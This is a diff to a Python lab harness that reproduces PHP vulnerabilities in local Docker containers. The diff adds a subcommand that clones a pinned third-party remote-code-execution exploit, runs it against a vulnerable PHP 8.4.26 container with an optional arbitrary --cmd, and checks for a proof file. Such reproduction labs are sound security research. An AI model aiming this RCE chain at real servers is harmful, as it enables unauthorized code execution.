@@ -18,9 +18,11 @@ Both labs build 8.5.11 (vulnerable) and 8.5.12 (fixed) from the same source and
 flags, so a behavioural difference is a PHP difference.
 
 Commands:
-  up [--only 109619|109618]   build and start the lab(s)
+  up [--only 109619|109618|109619-rce]
   down                        stop and remove
   109619 [--php V] [--control]
+  109619-rce [--php 8.4.26|8.4.27] [--fetch]
+                              end-to-end RCE with the pinned 9bie PoC
   109618 [--php V] [--vector headers|nested|chunked] [--repeat N]
   verify [--all]              run the positive/negative matrix
 
@@ -30,6 +32,7 @@ Loopback only. Run against infrastructure you own.
 from __future__ import annotations
 
 import argparse
+import contextlib
 import hashlib
 import http.client
 import io
@@ -57,6 +60,8 @@ PORTS = {
     ("109618", "8.5.11"): 18118,
     ("109618", "8.5.12"): 18117,
     ("109618-asan", "8.5.11"): 18123,
+    ("109619-rce", "8.4.26"): 18124,
+    ("109619-rce", "8.4.27"): 18125,
 }
 SERVICES = {
     ("109619", "8.5.11"): "php8511",
@@ -66,8 +71,13 @@ SERVICES = {
     ("109618", "8.5.11"): "apache8511",
     ("109618", "8.5.12"): "apache8512",
     ("109618-asan", "8.5.11"): "apache-asan8511",
+    ("109619-rce", "8.4.26"): "apache8426",
+    ("109619-rce", "8.4.27"): "apache8427",
 }
 VERSIONS = ("8.5.11", "8.5.12")
+RCE_PIN = "4586f5cc120c82fd468b17469202bac629810ad9"
+RCE_URL = "https://github.com/9bie/php2shell-bypass-aslr-exp"
+RCE_DIR = LAB / "third_party" / "9bie"
 
 
 # ---------------------------------------------------------------------------
@@ -88,10 +98,19 @@ def render() -> None:
         "php-fpm-pool.conf",
         "nginx-8511.conf",
         "nginx-8512.conf",
+        "php-8426.ini",
+        "apache-8426.conf",
         "zend-alloc-limit.patch",
         "compose.yml",
     ):
         shutil.copy2(TEMPLATES / name, LAB / name)
+
+    # The 9bie PoC runs as www-data and writes the proof into /out.
+    for name in ("out-rce", "out-rce-fixed"):
+        out = LAB / name
+        out.mkdir(exist_ok=True)
+        with contextlib.suppress(PermissionError):
+            out.chmod(0o777)
 
     src = TEMPLATES / "webroot"
     dst = LAB / "webroot"
@@ -115,6 +134,11 @@ def compose(*args: str, check: bool = True, timeout: int = 3600) -> subprocess.C
 
 def up(only: str | None = None) -> None:
     render()
+    if only == "109619-rce":
+        print("pulling official images (php:8.4.26-apache; 8.4.27 optional)")
+        compose("--profile", "109619-rce", "up", "-d", "--wait", "apache8426", timeout=900)
+        print(f"[+] 109619-rce PHP 8.4.26: http://{HOST}:{PORTS[('109619-rce', '8.4.26')]}")
+        return
     profiles = ["--profile", only] if only else ["--profile", "109619", "--profile", "109618"]
     print("building images (first run compiles PHP twice per version, be patient)")
     compose(*profiles, "up", "-d", "--build", "--force-recreate", "--wait", timeout=5400)
@@ -455,6 +479,79 @@ def chain_109618(
 
 
 # ---------------------------------------------------------------------------
+# 109619 RCE — external PoC, pinned
+# ---------------------------------------------------------------------------
+def fetch_9bie() -> None:
+    script = BASE / "scripts" / "fetch-9bie.sh"
+    subprocess.run(["sh", str(script)], check=True, timeout=600)
+
+
+def chain_109619_rce(
+    php: str = "8.4.26", fetch: bool = False, cmd: str | None = None, retries: int = 3
+) -> int:
+    """Run the 9bie chain against the official image.
+
+    The exploit is not vendored (upstream has no license); scripts/fetch-9bie.sh
+    clones it at RCE_PIN. It needs display_errors=On, memory_limit=8M and a
+    single prefork worker, which is what templates/php-8426.ini and
+    templates/apache-8426.conf provide.
+    """
+    if fetch:
+        fetch_9bie()
+    exe = RCE_DIR / "exploit.py"
+    if not exe.exists():
+        raise SystemExit(
+            f"missing {exe}\n"
+            "run: sh scripts/fetch-9bie.sh   (or: python3 php2shell.py 109619-rce --fetch)"
+        )
+
+    key = ("109619-rce", php)
+    service, port = SERVICES[key], PORTS[key]
+    render()
+    compose("--profile", "109619-rce", "up", "-d", "--wait", service, timeout=900)
+    container = cid(service)
+    out = LAB / ("out-rce" if php == "8.4.26" else "out-rce-fixed")
+    proof = out / "p1"
+    proof.unlink(missing_ok=True)
+    offsets = out / "offsets.env"
+    offsets.unlink(missing_ok=True)
+
+    cmdline = [
+        sys.executable,
+        str(exe),
+        "-u",
+        f"http://{HOST}:{port}/probe.php",
+        "--docker-container",
+        container,
+        "--offsets-file",
+        str(offsets),
+        "--proof-file",
+        str(proof),
+        "--profile",
+        "bookworm",
+        "--retries",
+        str(retries),
+    ]
+    if cmd:
+        cmdline += ["--cmd", cmd]
+    print(f"[*] {php} container {container[:12]} -> http://{HOST}:{port}/probe.php")
+    res = subprocess.run(cmdline, cwd=RCE_DIR, text=True, capture_output=True, timeout=900)
+    if res.stdout.strip():
+        print(res.stdout.strip())
+    if res.returncode != 0 and res.stderr.strip():
+        print(res.stderr.strip(), file=sys.stderr)
+
+    if proof.exists():
+        print(f"\nPROOF ({php}): {proof.read_text().strip()}")
+        return 0
+    if cmd and res.returncode == 0:
+        print(f"\nRCE OK ({php}), no proof file (custom --cmd)")
+        return 0
+    print(f"\nNO PROOF ({php}) — exploit exit {res.returncode}")
+    return 2
+
+
+# ---------------------------------------------------------------------------
 # verify
 # ---------------------------------------------------------------------------
 def verify(all_labs: bool = False) -> int:
@@ -496,7 +593,7 @@ def main() -> int:
     sub = ap.add_subparsers(dest="action", required=True)
 
     p = sub.add_parser("up", help="build and start the labs")
-    p.add_argument("--only", choices=["109619", "109618"], default=None)
+    p.add_argument("--only", choices=["109619", "109618", "109619-rce"], default=None)
 
     sub.add_parser("gen", help="render lab/ without starting anything (CI)")
 
@@ -507,6 +604,12 @@ def main() -> int:
     p.add_argument("--sapi", choices=["cli", "fpm"], default="cli")
     p.add_argument("--control", action="store_true", help="small filename: no OOM, expect no crash")
     p.add_argument("--timeout", type=int, default=30)
+
+    p = sub.add_parser("109619-rce", help="RCE with the pinned 9bie PoC (8.4.26 vulnerable)")
+    p.add_argument("--php", choices=["8.4.26", "8.4.27"], default="8.4.26")
+    p.add_argument("--fetch", action="store_true", help="clone/update the pinned PoC first")
+    p.add_argument("--cmd", default=None, help="command to run (<=14 bytes, or sh</out/c)")
+    p.add_argument("--retries", type=int, default=3)
 
     p = sub.add_parser("109618", help="run the request-startup OOM chain")
     p.add_argument("--php", choices=VERSIONS, default="8.5.11")
@@ -534,6 +637,8 @@ def main() -> int:
         return 0
     if args.action == "109619":
         return chain_109619(args.php, args.control, args.timeout, args.sapi)
+    if args.action == "109619-rce":
+        return chain_109619_rce(args.php, args.fetch, args.cmd, args.retries)
     if args.action == "109618":
         return chain_109618(args.php, args.vector, args.repeat, args.timeout, args.asan, args.count)
     if args.action == "verify":
